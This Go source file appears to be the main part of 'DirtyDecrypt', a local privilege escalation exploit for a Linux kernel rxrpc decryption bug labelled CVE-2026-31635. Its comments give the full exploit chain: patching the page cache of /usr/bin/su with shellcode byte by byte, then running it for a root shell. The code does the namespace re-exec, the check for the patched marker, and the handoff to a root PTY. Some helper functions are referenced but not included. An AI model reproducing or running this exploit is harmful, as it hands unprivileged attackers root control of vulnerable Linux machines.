package main

// DirtyDecrypt - Go port of CVE-2026-31635 LPE.
//
// Root cause: rxgk_decrypt_skb() in net/rxrpc/rxgk_common.h is missing
// skb_cow_data(). The krb5enc AEAD decrypts in-place before HMAC verification.
// Splicing a page-cache page into the rxrpc receive path writes the AES-CBC
// output directly back into the page cache.
//
// Chain:
//   1. Open /usr/bin/su, mmap its first page (live page-cache view)
//   2. Sliding-window loop: for each payload byte i, fire random-key
//      rxgk triggers until mmap[i] == shellELF[i] (1/256 per fire)
//   3. Each fire at offset i overwrites bytes i..i+15; next fire at i+1
//      repairs bytes i+1..i+15 without touching the already-written byte i
//   4. Exec /usr/bin/su from the patched page cache -> root shell via PTY

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

const workerEnv = "_DIRTYDECRYPT_WORKER"

func suAlreadyPatched() bool {
	marker := []byte{0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a}
	f, err := os.Open(targetPath)
	if err != nil {
		return false
	}
	defer f.Close()
	got := make([]byte, len(marker))
	if _, err := f.ReadAt(got, entryOffset); err != nil {
		return false
	}
	for i := range marker {
		if got[i] != marker[i] {
			return false
		}
	}
	return true
}

func main() {
	if os.Getenv(workerEnv) == "1" {
		runWorker()
		return
	}

	if os.Getuid() == 0 {
		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
		os.Exit(1)
	}

	patched := runLPE()
	if !patched {
		patched = suAlreadyPatched()
	}

	if patched {
		if err := runRootPTY(); err != nil {
			fmt.Fprintf(os.Stderr, "PTY error: %v\n", err)
		}
		return
	}

	fmt.Fprintln(os.Stderr, "dirtydecrypt-go: failed")
	os.Exit(1)
}

// runLPE spawns a namespace-isolated child via re-exec with Cloneflags.
// Go's runtime is multi-threaded so unshare(CLONE_NEWUSER) is forbidden;
// SysProcAttr.Cloneflags calls clone() before the Go runtime initialises.
func runLPE() bool {
	exe, err := os.Executable()
	if err != nil {
		exe = "/proc/self/exe"
	}

	cmd := exec.Command(exe)
	cmd.Env = append(os.Environ(), workerEnv+"=1")
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWUSER | syscall.CLONE_NEWNET,
		UidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getuid(), Size: 1},
		},
		GidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getgid(), Size: 1},
		},
		GidMappingsEnableSetgroups: false,
	}

	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] worker: %v\n", err)
		return false
	}
	return suAlreadyPatched()
}
